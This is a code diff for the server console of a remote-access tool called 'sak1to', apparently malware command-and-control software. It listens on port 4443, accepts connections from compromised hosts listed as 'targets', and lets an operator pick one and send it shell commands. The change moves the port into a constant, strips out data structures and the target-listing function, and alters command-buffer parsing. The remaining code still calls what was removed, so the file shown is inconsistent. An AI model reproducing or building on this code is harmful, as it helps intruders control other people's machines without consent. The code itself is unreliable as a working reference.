@@ -12,40 +12,12 @@ Use this code educationally/legally.
 #include <stdint.h>
 #include "sakito_tools.h"
 
+#define PORT 4443
+
 // Mutex lock for pthread race condition checks.
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 // Variable for mutex condition.
 pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;
- 
-typedef struct {
-	// Client hostname.
-	char* host;
-
-	// Client socket.
-	int sock;
-
-} Conn;
- 
-typedef struct {
-	// Server socket for accepting connections.
-	int listen_socket;
-
-	// Flag for race condition checks.
-	int THRD_FLAG;
-
-	// Array of Conn objects/structures.
-	Conn* clients;
-
-	// Memory blocks allocated.
-	size_t alloc;
-
-	// Amount of memory used.
-	size_t size;
-
-} Conn_map;
- 
-// Typedef for function pointer.
-typedef int (*func)(char*, size_t, int);
 
 void terminate_server(int listen_socket, char* error) {
 	close(listen_socket);
@@ -70,13 +42,13 @@ int create_socket() {
 }
  
 // Function to bind socket to specified port.
-void bind_socket(int listen_socket, const int port) {
+void bind_socket(int listen_socket) {
 	// Create sockaddr_in structure.
 	struct sockaddr_in serv_addr;
 	serv_addr.sin_family = AF_INET; 
 
 	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
-	serv_addr.sin_port = htons(port); 
+	serv_addr.sin_port = htons(PORT); 
 
 	// Bind ip address and port to listen_socket
 	if (bind(listen_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) 
@@ -96,7 +68,7 @@ void* accept_conns(void* param) {
 	conns->clients = malloc(conns->alloc * sizeof(Conn));
  
 	conns->listen_socket = create_socket();
-	bind_socket(conns->listen_socket, 4443);
+	bind_socket(conns->listen_socket);
  
 	while (1) {
 		// Wait for a connection.
@@ -145,23 +117,6 @@ void* accept_conns(void* param) {
 	
 		// Execution is finished so allow delete_conn() to continue.
 		conns->THRD_FLAG = 0;
-	}
-}
- 
-// Function to list/print all available connections to stdout.
-void list_connections(const Conn_map* conns) {
-	printf("\n\n---------------------------\n");
-	printf("---  C0NNECTED TARGETS  ---\n");
-	printf("--     Hostname: ID      --\n");
-	printf("---------------------------\n\n");
-
-	if (conns->size) {
-		for (size_t i = 0; i < conns->size; i++)
-			printf("%s: %lu\n", conns->clients[i].host, i);
-		printf("\n\n");
-	}
-	else {
-		printf("No connected targets available.\n\n\n");
 	}
 }
 
@@ -369,7 +324,8 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
  
-		size_t cmd_len = get_line(buf);
+ 		buf[0] = '0';
+		size_t cmd_len = get_line(&buf[1]) + 1;
 		char* cmd = &buf[1];
 
 		if (cmd_len > 1) {
@@ -431,12 +387,10 @@ int main(void) {
 		printf("sak1to-console // ");
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
 		char buf[BUFLEN + 1] = { 0 };
- 
 		size_t cmd_len = get_line(buf);
-		char* cmd = &buf[1];
  
 		if (cmd_len > 1) {
-			if (compare(cmd, "exit")) {
+			if (compare(buf, "exit")) {
 				// Quit accepting connections.
 				pthread_cancel(acp_thread);
 				// if there's any connections close them before exiting.
@@ -449,18 +403,18 @@ int main(void) {
 				close(conns.listen_socket);
 				break;
 			}
-			else if (compare(cmd, "cd ")) {
+			else if (compare(buf, "cd ")) {
 				// List all connections.
-				chdir(&cmd[3]);
+				chdir(&buf[3]);
 			}
-			else if (compare(cmd, "list")) {
+			else if (compare(buf, "list")) {
 				// List all connections.
 				list_connections(&conns);
 			}
-			else if (compare(cmd, "interact ")) {
+			else if (compare(buf, "interact ")) {
 				// Interact with client.
 				int client_id;
-				client_id = atoi(&cmd[9]);
+				client_id = atoi(&buf[9]);
 				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
 					printf("Invalid client identifier.\n");
 				else
@@ -468,7 +422,7 @@ int main(void) {
 			}
 			else {
 				// Execute command on host system.
-				exec_cmd(cmd);
+				exec_cmd(buf);
 			}
 		}
 	}
